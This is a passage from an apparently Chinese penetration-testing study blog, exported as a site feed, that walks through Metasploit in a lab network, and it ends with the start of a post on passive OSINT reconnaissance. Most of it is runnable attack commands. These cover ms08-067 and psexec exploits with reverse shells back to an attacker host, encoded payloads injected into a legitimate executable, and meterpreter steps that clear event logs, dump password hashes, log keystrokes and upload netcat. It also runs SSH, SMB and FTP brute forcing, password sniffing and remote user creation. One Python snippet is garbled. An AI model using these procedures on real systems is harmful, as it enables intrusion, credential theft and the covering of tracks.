use exploit/windows/smb/ms08_067_netapi
set RHOST 10.10.10.147
set RPORT 445
set PAYLOAD windows/shell/reverse_tcp
set LHOST 10.10.10.131
set LPORT 4444
exploit</code></pre><p><img src="https://i.imgur.com/rNO4Mud.png" alt="img"></p>
<pre><code>root@kali:~# cat psexec.rb 
use exploit/windows/smb/psexec
set RHOST 10.10.10.148
set PAYLOAD windows/shell/reverse_tcp
set LHOST 10.10.10.131
set LPORT 4444
set SMBUSER Administrator
set SMBPASS 123456
exploit</code></pre><p><img src="https://i.imgur.com/ctvHDYR.png" alt="img"></p>
<h5 id="2-Passive-Exploits"><a href="#2-Passive-Exploits" class="headerlink" title="2. Passive Exploits"></a>2. Passive Exploits</h5><p>攻击者等待受害者来触发连接，反弹到攻击者</p>
<pre><code>root@kali:~# cat ms07017.rb 
use exploit/windows/browser/ms07_017_ani_loadimage_chunksize
set URIPATH /
set SRVHOST 0.0.0.0
set PAYLOAD windows/shell/reverse_tcp
set EXITFUNC thread
set LHOST 10.10.10.131
set LPORT 4444
exploit</code></pre><p><img src="https://i.imgur.com/meKMAdB.png" alt="img"></p>
<p><img src="https://i.imgur.com/aEu1anZ.png" alt="img"></p>
<h4 id="6-生成payload"><a href="#6-生成payload" class="headerlink" title="6.生成payload"></a>6.生成payload</h4><ul>
<li>用法</li>
</ul>
<pre><code>msf &gt; search ms08-067
msf &gt; use payload/windows/shell/bind_tcp
msf payload(windows/shell/bind_tcp) &gt; generate  #获得shellcode
msf payload(windows/shell/bind_tcp) &gt; generate -h
    Usage: generate [options]
    Generates a payload.
    OPTIONS:
        -E        强制编码。
        -b &lt;opt&gt;  要避免的字符列表：&#39;\ x00 \ xff&#39;
        -e &lt;opt&gt;  要使用的编码器模块的名称。
        -f &lt;opt&gt;  输出文件名（否则为stdout）
        -h        帮助横幅。
        -i &lt;opt&gt;  编码迭代的次数。
        -k        保持模板可执行的功能
        -o &lt;opt&gt;  以VAR = VAL格式逗号分隔的选项列表。
        -p &lt;opt&gt;  输出平台
        -s &lt;opt&gt;  NOP sled length.
        -t &lt;opt&gt;  输出格式: bash,c,csharp,dw,dword,hex,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,axis2,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,jar,jsp,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,vba,vba-exe,vba-psh,vbs,war
        -x &lt;opt&gt;  要使用的可执行模板

msf payload(windows/shell/bind_tcp) &gt; generate</code></pre><p><img src="https://i.imgur.com/wEztOAj.png" alt="img"></p>
<ul>
<li>自动绕过坏字符</li>
</ul>
<pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00&#39;
msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00\x44\x67\x66\xfa\x01\xe0\x44\x67\xa1\xa2\xa3\x75\x4b&#39;</code></pre><ul>
<li>手动指定编码模块</li>
</ul>
<pre><code>msf payload(windows/shell/bind_tcp) &gt; show encoders</code></pre><p><img src="https://i.imgur.com/siajCwd.png" alt="img"></p>
<ul>
<li>注入文件</li>
</ul>
<pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -b &#39;\x00&#39; -t exe -e x86/shikata_ga_nai -i 5 -k -x /usr/share/windows-binaries/radmin.exe -f /root/1.exe</code></pre><ul>
<li><p>NOP：no-operation / Next Operation （无任何操作）</p>
<ul>
<li>EIP 返回存储 NOP sled 的任意地址时将递增，最终导致 shellcode 执行</li>
<li>增加一行 EOP</li>
</ul>
<pre><code>msf payload(windows/shell/bind_tcp) &gt; generate -s 14</code></pre></li>
</ul>
<h4 id="7-metepreter"><a href="#7-metepreter" class="headerlink" title="7. metepreter"></a>7. metepreter</h4><h5 id="1-简介"><a href="#1-简介" class="headerlink" title="1.简介"></a>1.简介</h5><ul>
<li>高级、动态、可扩展的 payload<ul>
<li>基于 metepreter 上下文利用更多漏洞发起攻击</li>
<li>后渗透测试阶段一站式操作界面</li>
</ul>
</li>
<li>完全基于内存的 DLL 注入式 payload （不写硬盘）<ul>
<li>注入合法系统进程并建立 stager</li>
<li>基于 stager 上传和预加载 dll 进行扩展模块 TLS/1.0 通信隧道</li>
<li>利用 TLS 隧道进一步加载后续扩展模块（避免网络取证）</li>
</ul>
</li>
<li>服务端使用 c 语言编写</li>
<li>客户端提供基于 ruby 的全特性 API（支持任何语言）</li>
</ul>
<h5 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h5><pre><code>root@kali:~# cat metepreter.rb 
use exploit/windows/smb/ms08_067_netapi
set payload windows/meterpreter/reverse_tcp
set RHOST 10.10.10.147
set LHOST 10.10.10.131
run</code></pre><p><img src="https://i.imgur.com/b9G8Uq6.png" alt="img"></p>
<ul>
<li>帮助文件</li>
</ul>
<pre><code>meterpreter &gt; help

核心命令
=============

    命令                     描述
    -------                   -----------
    ?                         帮助菜单
    background                背景当前会话
    bgkill                    杀死一个背景meterpreter脚本
    bglist                    列出运行后台脚本
    bgrun                     执行一个meterpreter脚本作为后台线程
    channel                   显示信息或控制活动频道
    close                     关闭频道
    disable_unicode_encoding  禁用unicode字符串的编码
    enable_unicode_encoding   启用unicode字符串的编码
    exit                      终止meterpreter会话
    get_timeouts              获取当前会话超时值
    guid                      获取会话GUID
    help                      帮助菜单
    info                      显示有关Post模块的信息
    irb                       进入irb脚本模式
    load                      加载一个或多个meterpreter扩展
    machine_id                获取连接到会话的计算机的MSF ID
    migrate                   将服务器迁移到另一个进程
    pivot                     管理数据透视监听器
    quit                      终止meterpreter会话
    read                      从频道读取数据
    resource                  运行存储在文件中的命令
    run                       执行meterpreter脚本或Post模块
    sessions                  快速切换到另一个会话
    set_timeouts              设置当前会话超时值
    sleep                     Force Meterpreter安静，然后重新建立会话。
    transport                 更改当前的传输机制
    use                       不推荐使用“加载”别名
    uuid                      获取当前会话的UUID
    write                     将数据写入通道


Stdapi: 文件系统命令
============================

    命令          描述
    -------       -----------
    cat           将文件的内容读取到屏幕上
    cd            更改目录
    checksum      检索文件的校验和
    cp            将源复制到目标
    dir           列表文件（ls的别名）
    download      下载文件或目录
    edit          编辑一个文件
    getlwd        打印本地工作目录
    getwd         打印工作目录
    lcd           更改本地工作目录
    lls           列出本地文件
    lpwd          打印本地工作目录
    ls            列出文件
    mkdir         建立目录
    mv            将源移到目标
    pwd           打印工作目录
    rm            删除指定的文件
    rmdir         删除目录
    search        搜索文件
    show_mount    列出所有安装点/逻辑驱动器
    upload        上传文件或目录


Stdapi: 网络命令
===========================

    命令          描述
    -------       -----------
    arp           显示主机ARP缓存
    getproxy      显示当前的代理配置
    ifconfig      显示界面
    ipconfig      显示界面
    netstat       显示网络连接
    portfwd       将本地端口转发到远程服务
    resolve       解析目标上的一组主机名
    route         查看和修改路由表


Stdapi: 系统命令
=======================

    Command       Description
    -------       -----------
    clearev       清除事件日志
    drop_token    放弃任何活动的模拟令牌。
    execute       执行一个命令
    getenv        获取一个或多个环境变量值
    getpid        获取当前的进程标识符
    getprivs      尝试启用当前进程可用的所有权限
    getsid        获取运行服务器的用户的SID
    getuid        获取服务器正在运行的用户
    kill          终止一个过程
    localtime     显示目标系统的本地日期和时间
    pgrep         按名称过滤进程
    pkill         按名称终止进程
    ps            列出运行的进程
    reboot        重新启动远程计算机
    reg           修改远程注册表并与之交互
    rev2self      在远程机器上调用RevertToSelf（）
    shell         放入系统命令外壳
    shutdown      关闭远程计算机
    steal_token   尝试从目标进程中盗取模拟令牌
    suspend       暂停或恢复进程列表
    sysinfo       获取有关远程系统的信息，例如OS


Stdapi: 用户界面命令
===============================

    命令          描述
    -------        -----------
    enumdesktops   列出所有可访问的桌面和窗口工作站
    getdesktop     获取当前meterpreter桌面
    idletime       返回远程用户闲置的秒数
    keyscan_dump   转储按键缓冲区
    keyscan_start  开始捕捉击键
    keyscan_stop   停止捕获击键
    screenshot     获取交互式桌面的屏幕截图
    setdesktop     更改meterpreters当前桌面
    uictl          控制一些用户界面组件


Stdapi: Webcam 命令
=======================

    命令          描述
    -------        -----------
    record_mic     从默认麦克风录制音频X秒
    webcam_chat    开始视频聊天
    webcam_list    列出网络摄像头
    webcam_snap    从指定的摄像头拍摄快照
    webcam_stream  从指定的摄像头播放视频流


Priv: Elevate Commands
======================

    命令          描述
    -------       -----------
    getsystem     尝试将您的特权提升为本地系统的特权。


Priv: 密码数据库命令
================================

    命令          描述
    -------       -----------
    hashdump      转储SAM数据库的内容


Priv: Timestomp 命令
========================

    命令          描述
    -------       -----------
    timestomp     操纵文件MACE属性</code></pre><ul>
<li>使用</li>
</ul>
<pre><code>meterpreter &gt; execute -f cmd.exe
meterpreter &gt; ps
meterpreter &gt; getuid
meterpreter &gt; getpid
meterpreter &gt; clearev   # 清除日志
meterpreter &gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32       # 上传文件

meterpreter &gt; upload /usr/share/windows-binaries/nc.exe c:\\windows\\system32
msf exploit(windows/smb/ms08_067_netapi) &gt; sessions -l
msf exploit(windows/smb/ms08_067_netapi) &gt; sessions -i 1

meterpreter &gt; hashdump  # 读取密码
meterpreter &gt; run post/windows/gather/hashdump  # 读取密码

meterpreter &gt; shell</code></pre><p><img src="https://i.imgur.com/lJasRoT.png" alt="img"></p>
<h4 id="Meterpreter-python-扩展"><a href="#Meterpreter-python-扩展" class="headerlink" title="Meterpreter python 扩展"></a>Meterpreter python 扩展</h4><ul>
<li>2015 年11月份，来自社区贡献</li>
<li>无需运行环境，在客户端运行原生 python 代码</li>
<li>使用</li>
</ul>
<pre><code>meterpreter &gt; load python
meterpreter &gt; python_execute &quot;print (&#39;asdasdas&#39;)&quot;
meterpreter &gt; python_execute &quot;import os; cd = os.getcwd()&quot; -r cd



root@kali:~# cat find2.py 
import os
for root,dirs,files in os.walk(c://*):
    for file in files:
        if file.endwith(&quot;.ini&quot; ) and file.startwith(&quot;win&quot;):
            print(os.path.john(root,file))
python_import -f find.py</code></pre><h4 id="9-msfcli"><a href="#9-msfcli" class="headerlink" title="9. msfcli"></a>9. msfcli</h4><ul>
<li>2015 年6月已经被取消</li>
<li>由 msfconsole -x 取代</li>
<li>编写脚本时便于引用</li>
</ul>
<pre><code>msfconsole -x &quot;use exploit/windows/smb/ms08_067_netapi; set RHOST 10.10.10.147; set PAYLOAD windows/meterpreter/reverse_tcp; set LHOST 10.10.10.131; set LPORT 5555; set target 34; exploit&quot;</code></pre><h3 id="Mestasploit-信息收集"><a href="#Mestasploit-信息收集" class="headerlink" title="Mestasploit 信息收集"></a>Mestasploit 信息收集</h3><h5 id="模块位置："><a href="#模块位置：" class="headerlink" title="模块位置："></a><strong>模块位置：</strong></h5><ul>
<li>信息收集的模块都在 auxiliary/scanner/ 之下</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/ [TAB]
Display all 531 possibilities? (y or n)</code></pre><h4 id="1-db-nmap"><a href="#1-db-nmap" class="headerlink" title="1. db_nmap"></a>1. db_nmap</h4><ul>
<li>跟 nmap 用法一样，结果存放在 msf 的数据库中</li>
</ul>
<pre><code>msf &gt; db_nmap -sV 10.10.10.0/24</code></pre><ul>
<li>auxiliary 目录下</li>
<li>RHOSTS &lt;&gt; RHOST<ul>
<li>192.168.1.20-192.168.1.30、192.168.1.0/24,192.168.11.0/24</li>
<li>也可以编写地址列表：file:/root/h.txt</li>
</ul>
</li>
</ul>
<h4 id="2-主机发现扫描"><a href="#2-主机发现扫描" class="headerlink" title="2.主机发现扫描"></a>2.主机发现扫描</h4><ul>
<li>use auxiliary/scanner/discovery/arp_sweep</li>
<li>set INTERFACE、RHOSTS、SHOST、SMAC、THREADS；run</li>
</ul>
<pre><code>msf &gt; search arp
msf &gt; use auxiliary/scanner/discovery/arp_sweep
msf auxiliary(scanner/discovery/arp_sweep) &gt; show options 
msf auxiliary(scanner/discovery/arp_sweep) &gt; set RHOSTS 10.10.10.0/24
msf auxiliary(scanner/discovery/arp_sweep) &gt; set INTERFACE eth0
msf auxiliary(scanner/discovery/arp_sweep) &gt; set THREADS 20
msf auxiliary(scanner/discovery/arp_sweep) &gt; run</code></pre><h4 id="3-端口扫描"><a href="#3-端口扫描" class="headerlink" title="3.端口扫描"></a>3.端口扫描</h4><ul>
<li>use auxiliary/scanner/portscan/syn</li>
<li>set INTERFACE、PORTS、RHOSTS、THREADS；run</li>
</ul>
<pre><code>msf &gt; search portscan
msf &gt; use auxiliary/scanner/portscan/syn
msf auxiliary(scanner/portscan/syn) &gt; show options 
msf auxiliary(scanner/portscan/syn) &gt; set INTERFACE eth0
msf auxiliary(scanner/portscan/syn) &gt; set PORTS 80
msf auxiliary(scanner/portscan/syn) &gt; set RHOSTS 10.10.10.0/24
msf auxiliary(scanner/portscan/syn) &gt; set THREADS 50
msf auxiliary(scanner/portscan/syn) &gt; run</code></pre><h4 id="4-僵尸扫描"><a href="#4-僵尸扫描" class="headerlink" title="4.僵尸扫描"></a>4.僵尸扫描</h4><ul>
<li>查找 ipidseq 主机（查找僵尸机）<ul>
<li>use auxiliary/scanner/ip/ipidseq</li>
<li>set RHOSTS 192.168.1.0/24 ；run</li>
<li>nmap -PN -sI 10.10.10.147 10.10.10.132</li>
</ul>
</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/ip/ipidseq
msf auxiliary(scanner/ip/ipidseq) &gt; show options 
msf auxiliary(scanner/ip/ipidseq) &gt; set RHOSTS 10.10.10.100-150
msf auxiliary(scanner/ip/ipidseq) &gt; set THREADS 20
msf auxiliary(scanner/ip/ipidseq) &gt; run</code></pre><pre><code>msf &gt; db_nmap -PN -sI 10.10.10.147 10.10.10.132</code></pre><h4 id="5-UDP扫描"><a href="#5-UDP扫描" class="headerlink" title="5.UDP扫描"></a>5.UDP扫描</h4><ul>
<li>use auxiliary/scanner/discovery/udp_sweep</li>
<li>use auxiliary/scanner/discovery/udp_probe</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/discovery/udp_sweep
msf auxiliary(scanner/discovery/udp_sweep) &gt; show options 
msf auxiliary(scanner/discovery/udp_sweep) &gt; set RHOSTS 10.10.10.100-150
msf auxiliary(scanner/discovery/udp_sweep) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/discovery/udp_probe
msf auxiliary(scanner/discovery/udp_probe) &gt; show options 
msf auxiliary(scanner/discovery/udp_probe) &gt; set RHOSTS 10.10.10.100-150
msf auxiliary(scanner/discovery/udp_probe) &gt; set CHOST 10.10.10.131
msf auxiliary(scanner/discovery/udp_probe) &gt; set THREADS 20
msf auxiliary(scanner/discovery/udp_probe) &gt; run</code></pre><h4 id="6-密码嗅探"><a href="#6-密码嗅探" class="headerlink" title="6.密码嗅探"></a>6.密码嗅探</h4><ul>
<li>use auxiliary/sniffer/psnuffle</li>
<li>支持从 pacap 抓包文件中提取密码</li>
<li>功能类似于 dsniff</li>
<li>目前只支持 pop3、imap、ftp、HTTP GET 协议</li>
</ul>
<pre><code>msf &gt; search sniffer
msf &gt; use auxiliary/sniffer/psnuffle
msf auxiliary(sniffer/psnuffle) &gt; show options 
msf auxiliary(sniffer/psnuffle) &gt; set INTERFACE eth0
msf auxiliary(sniffer/psnuffle) &gt; run</code></pre><pre><code>root@kali:~# ftp 10.10.10.148</code></pre><pre><code># 继续上述
msf auxiliary(sniffer/psnuffle) &gt; show options
msf auxiliary(sniffer/psnuffle) &gt; set PCAPFILE /root/ftp.pcapng
msf auxiliary(sniffer/psnuffle) &gt; jobs
msf auxiliary(sniffer/psnuffle) &gt; kill 0
msf auxiliary(sniffer/psnuffle) &gt; run</code></pre><h4 id="7-SNMP扫描"><a href="#7-SNMP扫描" class="headerlink" title="7.SNMP扫描"></a>7.SNMP扫描</h4><ul>
<li>vim /etc/snmp/snmpd.conf （侦听复制修改为 0.0.0.0：161）</li>
<li>use auxiliary/scanner/snmp/snmp_login</li>
<li>use auxiliary/scanner/snmp/snmp_enum</li>
<li>use auxiliary/scanner/snmp/snmp_enumusers （windows）</li>
<li>use auxiliary/scanner/snmp/snmp_enumshares （windows）</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_login
msf auxiliary(scanner/snmp/snmp_login) &gt; show options 
msf auxiliary(scanner/snmp/snmp_login) &gt; set RHOSTS 10.10.10.149
msf auxiliary(scanner/snmp/snmp_login) &gt; set THREADS 20
msf auxiliary(scanner/snmp/snmp_login) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enum
msf auxiliary(scanner/snmp/snmp_enum) &gt; show options 
msf auxiliary(scanner/snmp/snmp_enum) &gt; set RHOSTS 10.10.10.149
msf auxiliary(scanner/snmp/snmp_enum) &gt; run
</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enum
msf auxiliary(scanner/snmp/snmp_enum) &gt; show options 
msf auxiliary(scanner/snmp/snmp_enum) &gt; set RHOSTS 10.10.10.142 （windows）
msf auxiliary(scanner/snmp/snmp_enum) &gt; run
msf auxiliary(scanner/snmp/snmp_enum) &gt; set COMMUNITY jlcssadmin （SNMP 服务器团体名）
msf auxiliary(scanner/snmp/snmp_enum) &gt; set THREADS 20
msf auxiliary(scanner/snmp/snmp_enum) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enumusers
msf auxiliary(scanner/snmp/snmp_enumusers) &gt; show options 
msf auxiliary(scanner/snmp/snmp_enumusers) &gt; set COMMUNITY jlcssadmin
msf auxiliary(scanner/snmp/snmp_enumusers) &gt; set RHOSTS 10.10.10.142
msf auxiliary(scanner/snmp/snmp_enumusers) &gt; run</code></pre><pre><code>msf &gt; use auxiliary/scanner/snmp/snmp_enumshares
msf auxiliary(scanner/snmp/snmp_enumshares) &gt; show options 
msf auxiliary(scanner/snmp/snmp_enumshares) &gt; set COMMUNITY jlcssadmin
msf auxiliary(scanner/snmp/snmp_enumshares) &gt; set RHOSTS 10.10.10.142
msf auxiliary(scanner/snmp/snmp_enumshares) &gt; run</code></pre><h4 id="8-SMB扫描"><a href="#8-SMB扫描" class="headerlink" title="8.SMB扫描"></a>8.SMB扫描</h4><ul>
<li>SMB 版本扫描<ul>
<li>use auxiliary/scanner/smb/smb_version</li>
</ul>
</li>
<li>扫描命令管道。判断 SMB 服务类型（账号、密码）<ul>
<li>use auxiliary/scanner/smb/pipe_auditor</li>
</ul>
</li>
<li>扫描通过 SMB 管道可以访问的 RCERPC 服务<ul>
<li>use auxiliary/scanner/smb/pipe_dcerpc_auditor</li>
</ul>
</li>
<li>SMB 共享账号（账号、密码）<ul>
<li>use auxiliary/scanner/smb/smb_enumshares</li>
</ul>
</li>
<li>SMB 用户枚举（账号、密码）<ul>
<li>use auxiliary/scanner/smb/smb_enumusers</li>
</ul>
</li>
<li>SID 枚举（账号、密码）<ul>
<li>use auxiliary/scanner/smb/smb_lookupsid</li>
</ul>
</li>
<li>SMB 版本扫描</li>
</ul>
<pre><code>msf &gt; search smb
msf &gt; use auxiliary/scanner/smb/smb_version
msf auxiliary(scanner/smb/smb_version) &gt; show options 
msf auxiliary(scanner/smb/smb_version) &gt; set RHOSTS 10.10.10.147, 10.10.10.148, 10.10.10.142
msf auxiliary(scanner/smb/smb_version) &gt; run</code></pre><pre><code># 继续上述
msf auxiliary(scanner/smb/smb_version) &gt; set SMBUSER Administrator
msf auxiliary(scanner/smb/smb_version) &gt; set SMBPass 123456
msf auxiliary(scanner/smb/smb_version) &gt; run</code></pre><ul>
<li>扫描命令管道。判断 SMB 服务类型（账号、密码）</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/smb/pipe_auditor
msf auxiliary(scanner/smb/pipe_auditor) &gt; show options 
msf auxiliary(scanner/smb/pipe_auditor) &gt; set RHOSTS 10.10.10.148
msf auxiliary(scanner/smb/pipe_auditor) &gt; run</code></pre><pre><code># 继续上述
msf auxiliary(scanner/smb/pipe_auditor) &gt; set SMBUser Administrator
msf auxiliary(scanner/smb/pipe_auditor) &gt; set SMBPass 123456</code></pre><ul>
<li>扫描通过 SMB 管道可以访问的 RCERPC 服务</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/smb/pipe_dcerpc_auditor
msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; show options 
msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set RHOSTS 10.10.10.148
msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; run</code></pre><pre><code># 继续上述
msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set SMBUser Administrator
msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; set SMBPass 123456
msf auxiliary(scanner/smb/pipe_dcerpc_auditor) &gt; run</code></pre><ul>
<li>SMB 共享账号（账号、密码）</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/smb/smb_enumshares
msf auxiliary(scanner/smb/smb_enumshares) &gt; show options 
msf auxiliary(scanner/smb/smb_enumshares) &gt; set RHOSTS 10.10.10.148
msf auxiliary(scanner/smb/smb_enumshares) &gt; run</code></pre><pre><code># 继续上述
msf auxiliary(scanner/smb/smb_enumshares) &gt; set SMBUser Administrator
msf auxiliary(scanner/smb/smb_enumshares) &gt; set SMBPass 123456
msf auxiliary(scanner/smb/smb_enumshares) &gt; run</code></pre><ul>
<li>SMB 用户枚举（账号、密码）</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/smb/smb_enumusers
msf auxiliary(scanner/smb/smb_enumusers) &gt; show options 
msf auxiliary(scanner/smb/smb_enumusers) &gt; set RHOSTS 10.10.10.148
msf auxiliary(scanner/smb/smb_enumusers) &gt; run</code></pre><pre><code># 继续上述
msf auxiliary(scanner/smb/smb_enumusers) &gt; set SMBUser Administrator
msf auxiliary(scanner/smb/smb_enumusers) &gt; set SMBPass 123456
msf auxiliary(scanner/smb/smb_enumusers) &gt; run</code></pre><ul>
<li>SID 枚举（账号、密码）</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/smb/smb_lookupsid
msf auxiliary(scanner/smb/smb_lookupsid) &gt; show options 
msf auxiliary(scanner/smb/smb_lookupsid) &gt; set RHOSTS 10.10.10.148</code></pre><pre><code># 继续上述
msf auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBUser Administrator
msf auxiliary(scanner/smb/smb_lookupsid) &gt; set SMBPass 123456
msf auxiliary(scanner/smb/smb_lookupsid) &gt; run</code></pre><h4 id="SSH扫描"><a href="#SSH扫描" class="headerlink" title="SSH扫描"></a>SSH扫描</h4><ul>
<li>SSH 版本扫描<ul>
<li>use auxiliary/scanner/ssh/ssh_version</li>
</ul>
</li>
<li>SSH 密码爆破<ul>
<li>use auxiliary/scanner/ssh/ssh_login<ul>
<li>set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt ；set VERBOSE false ；run</li>
</ul>
</li>
</ul>
</li>
<li>SSH 公钥登陆<ul>
<li>use auxiliary/scanner/ssh/ssh_login_pubkey<ul>
<li>set KEY_FILE id_rsa；set USERNAME root ；run</li>
</ul>
</li>
</ul>
</li>
<li>SSH 版本扫描</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/ssh/ssh_version
msf auxiliary(scanner/ssh/ssh_version) &gt; set RHOSTS 10.10.10.132
msf auxiliary(scanner/ssh/ssh_version) &gt; run</code></pre><ul>
<li>SSH 密码爆破</li>
</ul>
<pre><code>root@kali:~# more /usr/share/metasploit-framework/data/wordlists/root_userpass.txt 

msf &gt; use auxiliary/scanner/ssh/ssh_login
msf auxiliary(scanner/ssh/ssh_login) &gt; set RHOSTS 10.10.10.132
msf auxiliary(scanner/ssh/ssh_login) &gt; set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
msf auxiliary(scanner/ssh/ssh_login) &gt; set VERBOSE false 
msf auxiliary(scanner/ssh/ssh_login) &gt; run</code></pre><ul>
<li>SSH 公钥登陆</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/ssh/ssh_login_pubkey
msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set RHOSTS 10.10.10.132
msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set USERNAME root
msf auxiliary(scanner/ssh/ssh_login_pubkey) &gt; set KEY_PATH id_rsa_test_file</code></pre><h4 id="windows缺少的补丁"><a href="#windows缺少的补丁" class="headerlink" title="windows缺少的补丁"></a>windows缺少的补丁</h4><ul>
<li><p>基于已经取得的 session 进行检测</p>
</li>
<li><p>use post/windows/gather/enum_patches</p>
<ul>
<li>show advanced</li>
<li>set VERBOSE yes</li>
</ul>
</li>
<li><p>检查失败</p>
<ul>
<li>known bug in WMI query, try migrating to another process</li>
<li>迁移到另一个进程再次进行尝试</li>
</ul>
</li>
<li><p>ms08-067</p>
</li>
</ul>
<pre><code>msf &gt; use exploit/windows/smb/ms08_067_netapi
msf exploit(windows/smb/ms08_067_netapi) &gt; set RHOST 10.10.10.147
msf exploit(windows/smb/ms08_067_netapi) &gt; set payload windows/meterpreter/reverse_tcp
msf exploit(windows/smb/ms08_067_netapi) &gt; run</code></pre><p><img src="https://i.imgur.com/oXOv9u8.png" alt="img"></p>
<pre><code>meterpreter &gt; backgroun
msf exploit(windows/smb/ms08_067_netapi) &gt; sessions </code></pre><p><img src="https://i.imgur.com/5eADIeS.png" alt="img"></p>
<pre><code>msf exploit(windows/smb/ms08_067_netapi) &gt; use post/windows/gather/enum_patches
msf post(windows/gather/enum_patches) &gt; set SESSION 4
msf post(windows/gather/enum_patches) &gt; run</code></pre><p><img src="https://i.imgur.com/VEpQ5Ut.png" alt="img"></p>
<pre><code># 进程错误，迁移进程
msf post(windows/gather/enum_patches) &gt; sessions -i 4
meterpreter &gt; getpid
meterpreter &gt; ps
meterpreter &gt; migrate 828  # spoolsv.exe
meterpreter &gt; background 
msf post(windows/gather/enum_patches) &gt; run</code></pre><p><img src="https://i.imgur.com/DCfpDji.png" alt="img"></p>
<h4 id="mssql-扫描"><a href="#mssql-扫描" class="headerlink" title="mssql 扫描"></a>mssql 扫描</h4><ul>
<li><p>mssql 扫描端口</p>
<ul>
<li>TCP 1422（动态端口）/ UDP 1434 （查询 TCP 端口号）</li>
<li>use auxiliary/scanner/mssql/mssql_ping</li>
</ul>
</li>
<li><p>爆破 mssql 密码</p>
</li>
<li><p>use auxiliary/scanner/mssql/mssql_login</p>
</li>
<li><p>远程执行代码（获取数据库权限之后）</p>
</li>
<li><p>use auxiliary/admin/mssql/mssql_exec</p>
<ul>
<li>set CMD net user user1 pass123 /ADD</li>
</ul>
</li>
<li><p>mssql扫描端口</p>
</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/mssql/mssql_ping
msf auxiliary(scanner/mssql/mssql_ping) &gt; set RHOSTS 10.10.10.142
msf auxiliary(scanner/mssql/mssql_ping) &gt; run</code></pre><h4 id="FTP扫描"><a href="#FTP扫描" class="headerlink" title="FTP扫描"></a>FTP扫描</h4><ul>
<li><p>ftp 版本扫描</p>
<ul>
<li>use auxiliary/scanner/ftp/ftp_version</li>
<li>use auxiliary/scanner/ftp/anonymous</li>
<li>use auxiliary/scanner/ftp/ftp_login</li>
</ul>
</li>
<li><p>use auxiliary/scanner/ [tab]</p>
</li>
<li><p>Display all 479 possibilities? (y or n)</p>
</li>
<li><p>查询版本信息</p>
</li>
</ul>
<pre><code>msf &gt; use auxiliary/scanner/ftp/ftp_version
msf (scanner/ftp/ftp_version) &gt; set RHOSTS 10.10.10.132
msf auxiliary(scanner/ftp/ftp_version) &gt; run</code></pre><p><img src="https://i.imgur.com/HZ8JVfi.png" alt="img"></p>
<ul>
<li><p>是否允许匿名登录</p>
<pre><code>msf &gt; use auxiliary/scanner/ftp/anonymous
msf auxiliary(scanner/ftp/anonymous) &gt; set RHOSTS 10.10.10.132
msf auxiliary(scanner/ftp/anonymous) &gt; run</code></pre></li>
</ul>
<p><img src="https://i.imgur.com/A6Ms8B3.png" alt="img"></p>
<ul>
<li><p>暴力破解</p>
<pre><code>use auxiliary/scanner/ftp/ftp_login</code></pre></li>
</ul>
]]></content>
      <categories>
        <category>渗透测试学习</category>
      </categories>
      <tags>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title>常见的被动信息收集方式总结</title>
    <url>/2020/03/12/shen-tou-ce-shi-bei-dong-xin-xi-shou-ji/</url>
    <content><![CDATA[<h2 id="渗透测试——-被动信息收集部分"><a href="#渗透测试——-被动信息收集部分" class="headerlink" title="渗透测试—— 被动信息收集部分"></a>渗透测试—— 被动信息收集部分</h2><h2 id="常见的被动信息收集方式总结"><a href="#常见的被动信息收集方式总结" class="headerlink" title="常见的被动信息收集方式总结"></a>常见的被动信息收集方式总结</h2><h5 id="被动信息收集简介"><a href="#被动信息收集简介" class="headerlink" title="被动信息收集简介"></a>被动信息收集简介</h5><ul>
<li>OSINT<ul>
<li>美国军方：<a href="http://www.fas.org/irp/doddir/army/atp2-22-9.pdf" target="_blank" rel="noopener">http://www.fas.org/irp/doddir/army/atp2-22-9.pdf</a></li>
<li>北大西洋公约组织：<a href="http://information-retrieval.info/docs/NATO-OSINT.html" target="_blank" rel="noopener">http://information-retrieval.info/docs/NATO-OSINT.html</a></li>
</ul>
</li>
<li>信息搜集内容<ul>
<li>IP地址段</li>
<li>域名信息</li>
<li>邮件地址</li>
<li>文档内容数据</li>
<li>公司地址</li>
<li>公司组织架构</li>
<li>联系电话/传真号码</li>
<li>人员姓名/职务</li>
<li>目标系统使用的技术架构</li>
<li>公开的商业信息</li>
</ul>
</li>
<li>信息用途<ul>
<li>用信息描述目标</li>
<li>发现</li>
<li>社会工程学攻击</li>
<li>物理缺口</li>
</ul>
</li>
</ul>
